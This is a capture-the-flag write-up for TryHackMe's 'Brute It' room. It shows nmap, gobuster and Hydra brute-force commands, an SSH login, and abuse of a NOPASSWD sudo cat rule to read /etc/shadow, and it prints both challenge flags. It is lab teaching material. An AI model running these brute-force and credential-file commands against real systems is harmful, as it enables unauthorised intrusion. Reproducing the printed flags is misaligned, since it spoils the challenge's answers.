# 🛡️ Brute It CTF – TryHackMe Write-up

## 📌 Challenge Overview

The objective of this challenge is to:

* Perform reconnaissance on the target
* Discover hidden web directories
* Brute-force login credentials
* Gain SSH access
* Escalate privileges to root

---

## 🔍 1. Reconnaissance

We begin with an Nmap scan to identify open ports and services:

```bash
nmap -sV -sC -T4 -Pn <Target_IP>
```

### Key Findings:

* Open HTTP service (web server)
* SSH service available

This indicates a typical web-to-SSH attack path.

---

## 📁 2. Directory Enumeration

To discover hidden directories on the web server, we used Gobuster:

```bash
gobuster dir -u http://<Target_IP> -w /usr/share/wordlists/dirb/common.txt
```

### Result:

* A hidden directory was discovered (used later for login brute-force)

---

## 🔐 3. Credential Brute-Forcing

The hidden directory contained a login panel. We used Hydra to brute-force credentials:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <Target-IP> http-post-form "/<hidden-directory>/:user=^USER^&pass=^PASS^:Invalid"
```

### Outcome:

* Successfully obtained valid credentials for the login panel

---

## 🔑 4. Gaining Initial Access (SSH)

After obtaining credentials (or SSH key), we logged in:

```bash
ssh -i id_rsa4 john@<Target_IP>
```

After entering the passphrase, access was granted.

---

## 🧾 5. User Flag

Once inside the system:

```bash
ls
cat user.txt
```

### 🎯 Flag:

```
THM{a_password_is_not_a_barrier}
```

---

## ⚙️ 6. Privilege Escalation

We checked sudo permissions:

```bash
sudo -l
```

### Critical Finding:

```
(root) NOPASSWD: /bin/cat
```

This means we can run `cat` as root without a password.

---

## 🔓 7. Extracting Sensitive Data

We leveraged this misconfiguration to read `/etc/shadow`:

```bash
sudo cat /etc/shadow
```

This exposed hashed passwords, including the root hash.

---

## 👑 8. Root Access

We used the obtained access to switch to root:

```bash
su root
```

---

## 🧾 9. Root Flag

```bash
cd /root
cat root.txt
```

### 🎯 Flag:

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 🧠 Key Takeaways

* Weak authentication mechanisms can be brute-forced easily
* Directory enumeration is crucial in web exploitation
* Misconfigured sudo permissions (NOPASSWD) are highly dangerous
* Access to `/etc/shadow` can lead to full system compromise
* Always check privilege escalation vectors after initial access
